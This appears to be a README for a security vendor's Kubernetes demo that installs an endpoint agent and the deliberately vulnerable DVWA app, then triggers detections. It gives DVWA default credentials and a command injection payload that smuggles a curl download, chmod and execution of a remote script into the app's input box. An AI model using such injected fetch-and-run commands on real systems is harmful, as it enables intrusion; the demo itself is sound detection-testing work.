Notes for installing and running the S1 K8s Agent + DVWA deployment scripts.

The "1-install-s1-k8s-agent.sh" script will facilitate the steps of installing the S1 Kubernetes Agent into your K8s Cluster.
It uses an external container registry (s1poc.azurecr.io) to avoid the hassle of setting up your own repos just for the sake
of running a simple demo/test.  

NOTE:  The above-mentioned script contains credentials that allow TEMPORARY ACCESS to the external container registry.  These 
credentials will need to be updated periodically (every few months).

The "2-install-dvwa-deployment.sh" script will issue the "kubectl apply -f dvwa-deploy.yaml" command for you so that you don't
have to type.  It will also output the URL at which the DVWA app will be accessible.

NOTE:  A bookmark has been created for DVWA in FireFox's Favorites Toolbar.

########## Using the DVWA application ##########

Access DVWA at:  http://localhost:32001
Username: admin
Password: password

Navigate to the "Command Injection" module.

Insert the following text into the input box:  127.0.0.1; curl https://s1demostorageaccount.z13.web.core.windows.net/script.sh -o script.sh; chmod u+x script.sh; ./script.sh

If running a Detect/Detect policy with Application Control enabled, the above should generate 3 incidents across 4 detection engines (SentinelOne Cloud, Static AI, 
Application Control and Behavioral AI).
